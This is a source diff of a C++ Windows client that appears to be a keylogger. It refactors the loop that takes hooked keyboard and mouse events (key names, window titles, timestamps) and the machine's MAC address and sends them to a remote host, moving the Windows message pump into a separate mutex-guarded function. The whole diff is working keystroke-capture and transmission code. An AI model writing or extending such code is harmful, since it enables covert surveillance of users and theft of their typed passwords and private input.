@@ -301,29 +301,25 @@ void		Client::unsetMouseHook(void)
 	unsetHook(m_mouseHook);
 }
 
-void		Client::sendBackMessage(std::string const &host, std::string const &port)
+void		Client::run(std::string const &host, std::string const &port)
 {
-	MSG		message;
 	ITime	&time(m_new_itime());
 	IProtocol	&protocol(m_new_iprotocol(m_new_iclient(host, port), m_new_itime()));
 
-	time.set_second(0);
-	time.set_nano(1000);
+	time.set_second(1);
+	time.set_nano(0);
 	protocol.mac_address(m_MAC);
-	while (true)
+	while (m_iselect(&time) == false)
 	{
-		while (PeekMessage(&message, NULL, 0, 0, PM_REMOVE))
-		{
-			TranslateMessage(&message);
-			DispatchMessage(&message);
-		}
+		protocol.select();
+		m_mutex.lock();
 		for (auto it = m_events.begin(); it != m_events.end(); it++)
 		{
 			if ((*it)->getInput() == Keyboard)
 			{
 				KeyboardEvent &key(*reinterpret_cast<KeyboardEvent *>(*it));
 				std::list<IProtocol::Keyboard *>	list;
-				IProtocol::Keyboard	keyboard{key.getSecond(), key.getNano(), key.getEvent(), key.getKeyData().getName(), key.getWinName()};
+				IProtocol::Keyboard	keyboard{ key.getSecond(), key.getNano(), key.getEvent(), key.getKeyData().getName(), key.getWinName() };
 				list.push_back(&keyboard);
 				protocol.keyboard(list);
 			}
@@ -331,16 +327,28 @@ void		Client::sendBackMessage(std::string const &host, std::string const &port)
 			{
 				MouseEvent &tmp(*reinterpret_cast<MouseEvent *>(*it));
 				std::list<IProtocol::Mouse *>	list;
-				IProtocol::Mouse	mouse{tmp.getSecond(), tmp.getNano(), tmp.getPos().getX(), tmp.getPos().getY(), 0, tmp.getEvent(), tmp.getButtonData().getName(), tmp.getWinName()};
+				IProtocol::Mouse	mouse{ tmp.getSecond(), tmp.getNano(), tmp.getPos().getX(), tmp.getPos().getY(), 0, tmp.getEvent(), tmp.getButtonData().getName(), tmp.getWinName() };
 				list.push_back(&mouse);
 				protocol.mouse(list);
 			}
 			delete *it;
 		}
 		m_events.clear();
-		protocol.select();
-		m_iselect(&time);
+		m_mutex.unlock();
 		protocol.run();
+	}
+}
+
+void		Client::sendBackMessage(void)
+{
+	MSG		message;
+
+	while (GetMessage(&message, NULL, 0, 0))
+	{
+		m_mutex.lock();
+		TranslateMessage(&message);
+		DispatchMessage(&message);
+		m_mutex.unlock();
 	}
 }
 
